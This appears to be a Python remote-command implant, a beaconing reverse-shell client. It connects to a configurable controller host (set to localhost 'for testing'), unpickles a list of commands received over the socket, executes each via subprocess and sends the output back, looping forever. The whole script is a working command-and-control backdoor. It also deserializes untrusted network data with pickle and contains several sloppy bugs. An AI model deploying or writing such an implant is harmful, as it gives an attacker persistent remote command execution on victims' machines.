#!/usr/bin/python3

# Standard libraries only
import sys
import socket
import subprocess
import time
import pickle


# Display script usage if not given correct number of arguments.
#if len(sys.argv) != 4:
#    print("usage:", sys.argv[0], "<rhost> <rport> <wait>")
#    sys.exit(1)

# Initialize global variables.
#rhost, rport, wait = sys.argv[1:4]
#wait = int(wait)
#rserver = (rhost, int(rport))

# TEMP FOR TESTING
rhost = "127.0.0.1"
rport = 7002
wait = 10
rserver = (rhost, rport)

def phone_home():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(rserver)
    except socket.error:
        print("Dad isn't home...")
    else:
        try:
            data = s.recv(1024)
        except ConnectionResetError or EOFError:
            print("Dad hung up on me...")
        else:
            cmd = pickle.loads(data)
            if cmd == "refused" or None:
                s.close
                s.shutdown
                s = None
                print("Dad isn't speaking with me...")
                return
            else:
                for c in cmd:
                    cmdarg = (c).split(" ")
                    try:
                        execute = subprocess.run(cmdarg, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                    except:
                        FileNotFoundError
                    else:
                        cmd_return = (str(c) + "\n" + str(execute.stdout))
                        s.sendall(bytes(cmd_return, "utf-8"))
            print("Told dad all about", cmd, "!")
    s.close
    s.shutdown
    s = None
    return

# Run the function forever.
while True:
    phone_home()
    time.sleep(wait)